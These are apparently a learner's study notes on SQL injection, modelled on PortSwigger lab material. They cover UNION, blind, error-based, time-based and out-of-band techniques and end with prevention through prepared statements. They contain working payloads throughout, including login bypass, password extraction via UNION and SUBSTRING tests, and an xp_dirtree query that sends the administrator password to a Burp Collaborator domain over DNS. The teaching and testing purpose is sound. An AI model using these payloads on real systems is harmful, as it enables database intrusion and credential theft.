## What is SQL injection (SQLi)?

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.

## How to detect SQL Injection vulnerabilities

Test every input point using:

- `'` → Check for SQL errors/anomalies.
- **SQL syntax** → Compare normal vs modified responses.
- `OR 1=1` vs `OR 1=2` → Look for response differences.
- **Time-delay payloads** → Check for unusual response delays.
- **OAST payloads** → Monitor for out-of-band interactions.
- **Burp Scanner** → Can automatically detect most SQLi vulnerabilities quickly.

## SQL Injection in Different Parts of a Query

SQLi can occur **anywhere in an SQL query**, not just the `WHERE` clause.

- **SELECT** → `WHERE`, table/column names, `ORDER BY`
- **UPDATE** → Updated values or `WHERE`
- **INSERT** → Inserted values

**Key point:** Always test **all user-controlled inputs**, regardless of where they appear in the query.

## Retrieving Hidden Data

A SQLi vulnerability can allow attackers to **bypass database filters** and retrieve hidden data.

Example:

```
SELECT * FROM products
WHERE category = 'Gifts' AND released = 1
```

- `category = 'Gifts'` → Shows products in the Gifts category.
- `released = 1` → Shows only released products.
- `released = 0` → Unreleased/hidden products.

**SQLi goal:** Manipulate the query to bypass conditions like `released = 1` and access hidden data.

**1. Bypass `released` filter**

**URL:**  
`https://insecure-website.com/products?category=Gifts'--`

**Query:**

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

- `--` → SQL comment, so the rest of the query is ignored.
- Removes `AND released = 1`.
- **Result:** Released + unreleased products are displayed.

---

**2. Return all products**

**URL:**  
`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

**Query:**

```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

- `1=1` → Always **TRUE**.
- `OR 1=1` → Makes the `WHERE` condition always true.
- **Result:** All products are returned.

⚠️ **Warning:** `OR 1=1` can be dangerous. If the input reaches an `UPDATE` or `DELETE` query, it could modify/delete unintended data.

## Subverting Application Logic

SQLi can **bypass login authentication** by commenting out the password check.

**Normal query:**

```sql
SELECT * FROM users
WHERE username = 'wiener' AND password = 'bluecheese'
```

**Attack input:**

- Username: `administrator'--`
    
- Password: blank
    

**Resulting query:**

```sql
SELECT * FROM users
WHERE username = 'administrator'--' AND password = ''
```

- `--` → Comments out the password condition.
    
- Only the username is checked.
    
- **Result:** Attacker logs in as `administrator` without knowing the password.
    

**Key idea:** SQLi can manipulate application logic by altering the original query.

## SQL Injection UNION Attacks

A **UNION attack** uses the SQL `UNION` keyword to append another `SELECT` query to the original query and retrieve data from other tables.

**Example:**

```sql
SELECT a, b FROM table1
UNION
SELECT c, d FROM table2
```

**Result:** One result set containing data from both tables.

**Key point:**  
`UNION` → Combines results of multiple `SELECT` queries, allowing SQLi to retrieve data from other database tables.

**Requirement:** The `SELECT` queries must return the **same number of columns**.

### SQL Injection UNION Attacks - Continued

For a `UNION` query to work, **2 requirements** must be met:

1. **Same number of columns** in both `SELECT` queries.
    
2. **Compatible data types** in corresponding columns.
    

**Before exploiting UNION SQLi, determine:**

- Number of columns returned by the original query.
    
- Which columns accept the required data type.
    

**Key idea:**  
`UNION` works only when **column count + data types are compatible**.

### Determining the Number of Columns

Another method is to use **`UNION SELECT` with increasing numbers of `NULL` values**:

```text
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL-- 
...
```

- Increase the number of `NULL` values until the response changes.
    
- **Wrong number of columns** → Error or different response.
    
- **Correct number** → Query succeeds and returns an additional row of `NULL` values.
    

**Why `NULL`?**  
`NULL` is compatible with most common SQL data types, increasing the chance of a successful `UNION`.

**Example:**  
If this works:

```text
' UNION SELECT NULL,NULL,NULL--
```

then the original query likely returns **3 columns**.

**Key idea:**  
`NULL` count = **number of columns** when the `UNION` succeeds.

### Database-Specific Syntax

SQLi syntax can vary between database systems.

- **Oracle:** Every `SELECT` requires `FROM`. Use the built-in `DUAL` table:
    

```sql
' UNION SELECT NULL FROM DUAL--
```

- **MySQL:** `--` must be followed by a **space**:
    

```sql
' UNION SELECT NULL-- 
```

Or use `#` for comments:

```sql
' UNION SELECT NULL#
```

**Key idea:** SQLi payloads must match the **database-specific syntax**.

**Reference:** [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet?utm_source=chatgpt.com)

### Finding Columns with a Useful Data Type

After finding the **number of columns**, determine which columns can store **string data**.

**Example: 4 columns**

```text
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

- Place `'a'` in **one column at a time**.
    
- No error + `'a'` appears in the response → column supports **string data**.
    
- Type conversion error → column is **not compatible** with strings.
    

**Key idea:**  
Find a column that accepts **string data**, then use that column to retrieve textual information through the UNION query.

### Using UNION SQLi to Retrieve Data

Once you know:

- **Number of columns** returned by the original query.
    
- Which columns support **string data**.
    
- The target **table and column names**.
    

You can use `UNION SELECT` to retrieve data.

**Example:**

```sql
' UNION SELECT username, password FROM users--
```

**Scenario:**

- Original query → 2 columns.
    
- Both columns support strings.
    
- Table → `users`
    
- Columns → `username`, `password`
    

**Key idea:**  
`UNION SELECT` can append results from another table to the original query.

> Modern databases provide ways to enumerate their **schema/structure**, including tables and columns, when their names are unknown.

### Retrieving Multiple Values in a Single Column

If the query returns **only one column**, you can concatenate multiple values into that column.

**Oracle example:**

```sql
' UNION SELECT username || '~' || password FROM users--
```

- `||` → String concatenation operator in Oracle.
    
- `~` → Separator between values.
    
- Combines `username` + `password` into one column.
    

**Example output:**

```text
administrator~s3cure
wiener~peter
carlos~montoya
```

**Key idea:**  
When only one column is available, **concatenate multiple values into a single column**.

Different databases use different concatenation syntax.

### Examining the Database in SQL Injection Attacks

To exploit SQLi, you may need to identify:

- **Database type & version**
    
- **Tables & columns**
    

### Querying Database Type & Version

Different databases use different queries:

|Database|Version Query|
|---|---|
|Microsoft SQL Server|`SELECT @@version`|
|MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|

**Example UNION payload:**

```sql
' UNION SELECT @@version--
```

If the response contains something like:

```text
Microsoft SQL Server 2016 (SP2) ... (64-bit)
```

you can identify the **database type and version**.

**Key idea:**  
Use **database-specific version queries** to fingerprint the backend DBMS before continuing with further SQLi testing.

### Listing the Contents of the Database

Most databases, **except Oracle**, provide `information_schema` views that reveal database structure.

**List all tables:**

```sql
SELECT * FROM information_schema.tables
```

Example output:

```text
TABLE_NAME
Products
Users
Feedback
```

**List columns of a specific table:**

```sql
SELECT * FROM information_schema.columns
WHERE table_name = 'Users'
```

Example:

```text
COLUMN_NAME    DATA_TYPE
UserId         int
Username       varchar
Password       varchar
```

**Key idea:**

`information_schema.tables` → Find **tables**  
`information_schema.columns` → Find **columns + data types**

This helps identify the database structure before further SQLi testing.

### Blind SQL Injection

**Blind SQLi** occurs when an application is vulnerable to SQL injection, but the HTTP response **doesn't reveal the query results or database errors**.

Because the injected data isn't directly visible, techniques like **`UNION` attacks** often don't work.

Instead, attackers infer information through **indirect differences in the application's behavior**, such as:

- **Boolean-based:** Different responses for `TRUE` vs `FALSE` conditions.
    
- **Time-based:** Different response times when a condition is true.
    
- **OAST:** Out-of-band interactions triggered by the database.
    

**Key idea:**

> Blind SQLi = SQL injection where **query results/errors aren't directly visible**, so information must be extracted indirectly.


### Blind SQLi: Triggering Conditional Responses

In **blind SQLi**, the query results aren't displayed, but the application's **behavior changes depending on whether a condition is true or false**.

**Example request:**

```http
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

**Backend query:**

```sql
SELECT TrackingId FROM TrackedUsers
WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

If the `TrackingId` is recognized:

> **Welcome back**

If it's not recognized, the response is different.

### Exploitation concept

Inject a condition that produces different application responses:

```text
TRUE condition  → "Welcome back"
FALSE condition → Different response
```

By repeatedly testing **TRUE/FALSE conditions**, information can be inferred even though the SQL query results aren't directly visible.

**Key idea:**

> Blind SQLi uses **observable application behavior as a signal** to extract information from the database.

### Blind SQLi: Conditional Responses - Continued

Blind SQLi can use **TRUE/FALSE conditions** to infer database information.

**TRUE condition:**

```text
...xyz' AND '1'='1
```

→ Condition is **TRUE** → Query returns data → **"Welcome back"** appears.

**FALSE condition:**

```text
...xyz' AND '1'='2
```

→ Condition is **FALSE** → Query returns no data → **"Welcome back"** doesn't appear.

### Concept

```text
TRUE  → "Welcome back" appears
FALSE → "Welcome back" absent
```

By testing different conditions repeatedly, you can **infer information from the database one piece at a time**, even though the actual query results aren't displayed.

**Key idea:**

> Blind SQLi turns application behavior into a **TRUE/FALSE information channel**.

### Blind SQLi: Extracting Data Character by Character

In blind SQLi, you can determine a value **one character at a time** by testing whether a condition is true or false.

**Example:** Find the first character of `Administrator`'s password:

```sql
xyz' AND SUBSTRING(
    (SELECT Password FROM Users WHERE Username = 'Administrator'),
    1, 1
) > 'm
```

→ **TRUE** → "Welcome back" appears → first character is greater than `m`.

```sql
xyz' AND SUBSTRING(
    (SELECT Password FROM Users WHERE Username = 'Administrator'),
    1, 1
) > 't
```

→ **FALSE** → "Welcome back" absent → first character isn't greater than `t`.

Eventually:

```sql
xyz' AND SUBSTRING(
    (SELECT Password FROM Users WHERE Username = 'Administrator'),
    1, 1
) = 's
```

→ **TRUE** → First character is `s`.

### Process

```text
Position 1 → Test characters → Find character
Position 2 → Test characters → Find character
Position 3 → Test characters → Find character
        ↓
     Full value
```

**Note:** `SUBSTRING` may be called `SUBSTR` on some databases.

**Key idea:**

> Blind SQLi can extract data **character by character using TRUE/FALSE responses**.


### Error-Based SQL Injection

**Error-based SQLi** uses database/application **error messages** to extract or infer information, even when the query results aren't normally visible.

Two common techniques:

1. **Conditional errors**
    
    - Trigger an error when a **boolean condition is TRUE/FALSE**.
        
    - Use the error/no-error response as a signal, similar to blind SQLi.
        
2. **Verbose SQL errors**
    
    - Trigger errors that **include data from the database**.
        
    - This can turn a **blind SQLi into a visible SQLi**.
        

**Key idea:**

> Error-based SQLi = Use **database errors as an information channel** to extract or infer data.


### Blind SQLi: Triggering Conditional Errors

Sometimes an application gives the **same response** whether a query returns data or not. In that case, normal boolean-based blind SQLi won't work.

Instead, you can use **errors as a TRUE/FALSE signal**.

### How it works

Modify the SQL query so that:

```text
Condition TRUE  → Database error occurs → Different response
Condition FALSE → No error → Normal response
```

For example, conceptually:

```sql
IF(condition, cause_error, do_nothing)
```

If the database produces an error only when the condition is true, you can determine whether the condition is **TRUE or FALSE** by observing the application's response.

**Key idea:**

> **Error-based blind SQLi = Make the database throw an error conditionally, then use the error/no-error difference as your information channel.**

This works even when the application doesn't display the query results or change its normal response based on returned data.


### Blind SQLi: Conditional Errors - Continued

You can use `CASE` to **trigger a database error only when a condition is TRUE**.

**Example:**

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```

`1=2` is **FALSE** → returns `'a'` → **No error**.

```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

`1=1` is **TRUE** → executes `1/0` → **Divide-by-zero error**.

### Extracting Data

You can use the same technique to test password characters:

```sql
xyz' AND (
    SELECT CASE
        WHEN (
            Username='Administrator'
            AND SUBSTRING(Password,1,1) > 'm'
        )
        THEN 1/0
        ELSE 'a'
    END
    FROM Users
)='a'



xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

The response tells you whether the condition is true:

```text
Condition TRUE  → Error occurs
Condition FALSE → No error
```

Then change `SUBSTRING(Password,1,1)` to:

```text
SUBSTRING(Password,2,1)  → Character 2
SUBSTRING(Password,3,1)  → Character 3
SUBSTRING(Password,4,1)  → Character 4
```

**Key idea:**

> **Conditional error = TRUE → error, FALSE → no error.** This turns database errors into a TRUE/FALSE channel for extracting information character by character.


### For Oracle Database

Testing Blind SQLi Conditional Errors:

```sql
XYZ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
```

This will cause Error.

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
```
This will not cause Error.


After testing. Extract password Character-by-Character.
### Extracting Data

```sql
' AND (SELECT CASE
WHEN (SUBSTR(password,1,1) > '0')
THEN TO_CHAR(1/0)
ELSE 'a'
END
FROM users
WHERE username='administrator')='a



xyz' AND (SELECT CASE WHEN (SUBSTR(PASSWORD,1,1) > '0') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a

```

The response tells you whether the condition is true:

```text
Condition TRUE  → Error occurs
Condition FALSE → No error
```

### Extracting Sensitive Data via Verbose SQL Error Messages

Database **misconfigurations** can cause verbose error messages that reveal useful information about the SQL query.

**Example error:**

```text
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

This reveals:

- The **full SQL query** constructed by the application.
    
- The injection point is inside a **single-quoted string** in the `WHERE` clause.
    
- The query structure can help construct a valid SQLi payload.
    
- Commenting out the remaining query can prevent extra characters from causing syntax errors.
    

**Key idea:**

> Verbose SQL errors can reveal the **query structure and injection context**, making SQLi payload construction easier.

### Extracting Sensitive Data via Verbose SQL Error Messages

Sometimes, you can trigger an error that **reveals data returned by the SQL query**, turning a blind SQLi into a visible one.

### Using `CAST()`

`CAST()` converts one data type into another.

**Example:**

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

If the retrieved value is a string, converting it to `int` may cause an error containing the actual data:

```text
ERROR: invalid input syntax for type integer: "Example data"
```

The error message exposes the **database value** that failed conversion.

**Key idea:**

> `CAST()` + incompatible data type → error may reveal the queried data.

This technique can also be useful when **character limits** prevent the use of conditional-response techniques.

### Blind SQLi: Triggering Time Delays

**Time-based blind SQLi** is used when database errors are handled gracefully and don't cause visible response differences.

- Inject a condition that triggers a **time delay** when executed.
    
- SQL queries are usually processed synchronously, so the delay also delays the HTTP response.
    
- Observe the response time to infer whether the condition is **TRUE or FALSE**.
    

**Concept:**

- Condition TRUE → Delay occurs → Slower response.
    
- Condition FALSE → No delay → Normal response.
    

**Key idea:** Time-based blind SQLi uses **HTTP response timing as a TRUE/FALSE information channel**, even when query results and database errors aren't visible.

### Blind SQLi: Triggering Time Delays (Continued)

Microsoft SQL Server payloads:

SQL

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

- `1=2` is false, so no delay occurs.
    
- `1=1` is true, so the response is delayed by 10 seconds.
    

Extracting data character by character:

SQL

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

- `SUBSTRING(Password, 1, 1)` extracts the first password character.
    
- `> 'm'` tests whether that character is greater than `m`.
    
- If the condition is true, `WAITFOR DELAY` delays the response.
    
- Repeating this process reveals password characters through response timing.
    

Key point: Time-delay syntax varies by database type. See the SQL injection cheat sheet for database-specific techniques.

## Blind SQLi Using Out-of-Band (OAST) Techniques

OAST (Out-of-Band Application Security Testing) detects SQL injection through network interactions when normal responses reveal no information.

- Problem: The SQL query runs asynchronously, so the HTTP response doesn't reveal query results, errors, or execution time.
    
- Solution: Trigger a network interaction with a system you control.
    
- DNS: Commonly used because many networks allow DNS queries for normal operations.
    
- Conditional extraction: Trigger network interactions based on conditions to infer data one piece at a time.
    
- Direct exfiltration: In some cases, injected queries can send data directly through a network interaction.
    

Key difference:

|Technique|Information channel|
|---|---|
|Boolean-based blind SQLi|Response differences|
|Time-based blind SQLi|Response timing|
|OAST-based blind SQLi|Out-of-band network interactions|

Remember: OAST is particularly useful when the application hides database errors, ignores query results, and responds independently of query execution time. DNS is a common channel, but whether it works depends on the database and network configuration.

## Blind SQLi Using OAST: Burp Collaborator

Burp Collaborator detects out-of-band network interactions, including DNS lookups, caused by a vulnerable application.

- Purpose: Detect SQL injection when HTTP responses reveal no useful information.
    
- Workflow: Generate a unique Collaborator domain → inject a database-specific payload → poll Collaborator → check for DNS interactions.
    
- Database-specific syntax: The payload depends on the database engine.
    

Microsoft SQL Server payload:

SQL

```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

Expected DNS lookup:

```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

Key point: A matching DNS interaction confirms that the injected input triggered an out-of-band request. Use a unique Collaborator domain for each test to correlate interactions with individual payloads.

Tool requirement: Burp Collaborator's built-in client is included with Burp Suite Professional.

## Blind SQLi: Exfiltrating Data Using OAST

OAST-based data exfiltration sends database information through an out-of-band network interaction, such as a DNS lookup.

### Microsoft SQL Server payload

SQL

```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

### How it works

1. Declare variable: `@p` stores the password.
    
2. Retrieve data: The subquery selects the Administrator's password from `users`.
    
3. Build the domain: The payload appends the password to a unique Burp Collaborator subdomain.
    
4. Trigger DNS: `xp_dirtree` causes the database server to perform a network lookup.
    
5. Observe data: The captured DNS interaction may reveal the password within the requested hostname.
    

Example observed hostname:

```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

### Key points

- OAST can both detect SQL injection and extract data.
    
- DNS is useful when HTTP responses, database errors, and response timing provide no information.
    
- Payload syntax depends on the database engine and its network permissions.
    
- Use unique Collaborator subdomains to correlate interactions with individual tests.
    

Remember: OAST turns an otherwise invisible SQL injection into an observable network interaction.

## SQL Injection in Different Contexts

SQL injection can occur in any user-controlled input processed by a SQL query, not just URL query parameters.

- Input formats: Query strings, JSON, XML, cookies, and other request fields.
    
- WAF bypass: Weak filters may look for SQL keywords and can sometimes be bypassed using encoding or escaping.
    
- XML encoding: XML character references are decoded server-side before SQL processing.
    

Example XML payload:

```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

- `&#x53;` represents the character `S`.
    
- After XML decoding, `&#x53;ELECT` becomes `SELECT`.
    
- If the application concatenates this input into a SQL query unsafely, the injection may succeed.
    

Key takeaway: Always examine the full HTTP request, including JSON/XML bodies, cookies, and headers. Input encoding is not a security fix; applications should use parameterized queries and validate inputs appropriately.


## Second-Order SQL Injection (Stored SQLi)

- First-order SQLi: User input is incorporated unsafely into a SQL query during the initial request.
    
- Second-order SQLi: User input is stored safely, but later retrieved and incorporated unsafely into another SQL query.
    
- Cause: Developers incorrectly assume previously stored data is trustworthy.
    
- Key difference: Second-order SQLi is triggered during later processing, not necessarily when the input is first submitted.
    

Example flow:

1. User submits crafted input.
    
2. Application safely stores it in the database.
    
3. A later request retrieves the stored input.
    
4. The application inserts it into a SQL query unsafely.
    
5. SQL injection occurs.
    

Key takeaway: Stored data is not automatically safe. Use parameterized queries whenever data is used in SQL, including data retrieved from your own database.

Reference: [PortSwigger: Second-order SQL injection](https://portswigger.net/web-security/sql-injection#second-order-sql-injection)

## How to Prevent SQL Injection

Use parameterized queries (prepared statements) instead of concatenating user input directly into SQL queries.

### Vulnerable code

```
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

- User input is concatenated directly into the SQL query.
    
- An attacker may alter the query structure using crafted input.
    

### Secure code

```
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

- `?` is a parameter placeholder.
    
- `setString(1, input)` binds user input as data.
    
- User input cannot change the intended SQL query structure.
    

### Key takeaways

- Prefer prepared statements over string concatenation.
    
- Apply parameterized queries to all untrusted data used in SQL.
    
- Use allowlist validation for dynamic table names, column names, and sort directions, which generally cannot be bound as ordinary parameters.
    
- Escaping alone is not a reliable substitute for parameterization.

## Preventing SQL Injection (Continued)

- Where parameterization works: Untrusted values in `WHERE`, `INSERT`, and `UPDATE` statements.
    
- Where it doesn't: Dynamic table names, column names, and `ORDER BY` clauses cannot generally use ordinary value placeholders.
    
- Alternative: Use an allowlist of permitted identifiers or predefined query logic.
    
- Hard-coded query structure: The SQL query string must remain constant and must not contain concatenated variable data.
    
- Never assume data is trusted: Data from databases or internal application components can also become unsafe.
    

Key takeaway: Parameterize all SQL values, allowlist dynamic identifiers, and never build SQL queries by concatenating variable data.


# END ;)